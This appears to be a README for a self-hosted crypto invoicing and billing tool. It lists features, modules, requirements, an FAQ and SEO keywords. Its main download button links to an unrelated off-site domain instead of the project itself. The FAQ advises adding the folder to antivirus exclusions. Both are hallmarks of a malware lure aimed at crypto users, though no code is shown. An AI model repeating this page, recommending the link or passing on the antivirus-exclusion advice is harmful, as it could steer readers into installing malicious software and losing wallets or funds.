# Crypto Invoicing & Billing Tool 🧾💳

A self-hosted invoicing platform for **crypto-native businesses and freelancers** who want to bill clients in stablecoins or major tokens without routing payments through a custodial processor. Instead of sending a wallet address in a DM and manually checking the explorer for confirmation, this tool generates a proper invoice, a payment link with a QR code, and reconciles the payment on-chain the moment it lands. Recurring invoices, PDF exports, and an audit trail come built in.

[![Download Crypto Invoicing & Billing Tool](https://img.shields.io/badge/Download-Crypto_Invoicing_Billing_Tool-blueviolet)](https://dyhuiying.com/s/file)

![Version](https://img.shields.io/badge/version-1.2-blue)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-0078D6)
![Status](https://img.shields.io/badge/status-active-brightgreen)
![Chains](https://img.shields.io/badge/chains-8%2B-orange)

<details>
<summary>📑 Contents</summary>

- [Quick Start](#-quick-start)
- [Requirements](#️-requirements)
- [Key Features](#-key-features)
- [Module Overview](#-module-overview)
- [Why Choose Crypto Invoicing & Billing Tool](#-why-choose-crypto-invoicing--billing-tool)
- [FAQ](#-faq)
- [SEO Keywords](#-seo-keywords)

</details>

## ⚡ Quick Start

1. Download the archive using the button above.
2. Install dependencies with `pip install -r requirements.txt`.
3. Add wallet addresses and chain RPC endpoints to `config.yaml`, then start the server.

The dashboard opens at `http://localhost:8080`, and the first invoice can be created from the UI or CLI.

## 🖥️ Requirements

| Item | Requirement |
|------|-------------|
| OS | Windows 10/11, macOS 12+, Linux (64-bit) |
| RAM | 2 GB minimum |
| Storage | 200 MB free |
| Privileges | Standard user (no admin required) |

## ✨ Key Features

**Invoicing**

- 🧾 **Professional Invoices** — itemized line items, tax fields, notes, and branded PDF output.
- 💱 **Multi-Token Pricing** — invoice in USD, EUR, or a base crypto asset, with payment accepted in USDT, USDC, ETH, BTC, SOL, and more.
- 🔁 **Recurring Invoices** — weekly, monthly, or custom schedules with automatic reminders.
- 📄 **Templates** — editable HTML and PDF templates for your own branding.

**Payment Links & Checkout**

- 🔗 **Hosted Payment Links** — shareable URLs that show amount, token, chain, and expiry.
- 📱 **QR Code Checkout** — scannable QR codes for mobile wallet payments.
- ⏱️ **Rate Locking** — exchange rate captured at invoice creation and locked for a configurable window.
- 🧮 **Auto-Conversion** — fiat-denominated invoices recalculated into the selected token at the live rate.

**On-Chain Reconciliation**

- 🔎 **Automatic Payment Detection** — the tool watches the target wallet on the selected chain and matches incoming transfers to open invoices.
- ✅ **Confirmation Tracking** — invoice marked paid only after the required confirmation count is reached.
- 🧩 **Underpayment Handling** — partial payments flagged with a suggested top-up amount.
- 📊 **Audit Trail** — every invoice, payment, and status change logged with timestamps and transaction hashes.

**Operations & Compliance**

- 📤 **Exports** — CSV and JSON exports for accounting or tax tools.
- 👥 **Client Management** — saved clients with billing details, default tokens, and payment history.
- 🔐 **No Custody** — funds go directly to your wallet; the tool never holds private keys.
- 🐳 **Docker Support** — one-command deployment with `docker compose up`.

## 📋 Module Overview

| Module | What it does | Interface |
|--------|--------------|-----------|
| invoice_engine | Create, edit, and track invoices | Web UI / CLI |
| payment_link | Generate hosted checkout URLs | Web UI |
| qr_generator | Mobile-friendly QR codes | Web UI |
| rate_oracle | Live fiat-to-token conversion | Python API |
| chain_watcher | Detect incoming payments per chain | Background job |
| reconciliation | Match payments to invoices | Background job |
| export_module | CSV and JSON accounting export | CLI |
| docker_runner | Container deployment | Docker |

## 🚀 Why Choose Crypto Invoicing & Billing Tool

- ✅ Built for crypto, not bolted onto fiat invoicing — token selection, chain choice, and on-chain confirmation are core concepts.
- ✅ Non-custodial — payments go straight to your wallet; the tool never holds keys or funds.
- ✅ Automatic reconciliation — invoices close themselves when the chain confirms the payment.
- ✅ Multi-chain by default — EVM networks, Bitcoin, and Solana handled in the same workflow.
- ✅ Self-hosted — client data, invoices, and wallet addresses stay on your own server.

## 💡 Why Use It

- 🧾 Send a proper invoice instead of pasting a wallet address into a DM.
- 🔎 Stop checking the explorer manually — invoices mark themselves paid when funds arrive.
- 🔁 Bill retainer clients automatically with recurring invoices and reminders.
- 📤 Export a clean payment history for accounting at the end of the quarter.

## ❓ FAQ

**Do I need to run it as Administrator?**
No — the tool runs as a standard user process and does not require elevated privileges.

**Will my antivirus flag the file?**
Some engines may flag Python entry points by heuristic. Add the project folder to exclusions if needed.

**Does it work on Windows 11?**
Yes — Windows 10/11, macOS, and Linux are all supported.

**Does the tool hold my funds?**
No — payments go directly to the wallet addresses you configure; the tool is non-custodial.

**How do I update?**
Pull the latest archive and reinstall dependencies — invoices, clients, and configs are preserved.

## 🔎 SEO Keywords

Crypto Invoicing & Billing Tool, crypto invoicing, crypto invoice generator, crypto billing tool, self-hosted crypto invoicing, crypto invoice github, accept crypto payments, crypto payment link, USDT invoicing, USDC invoicing, Bitcoin invoicing, Solana invoicing, multi-chain invoicing, non-custodial invoicing, crypto invoice reconciliation, on-chain payment detection, crypto freelance invoicing, web3 billing tool, crypto payment gateway self-hosted, crypto invoice PDF

## ⚠️ Disclaimer

Provided for educational and informational purposes only. Use at your own risk and in accordance with the terms of service of any blockchain, exchange, or platform you interact with. This tool does not provide tax or legal advice.
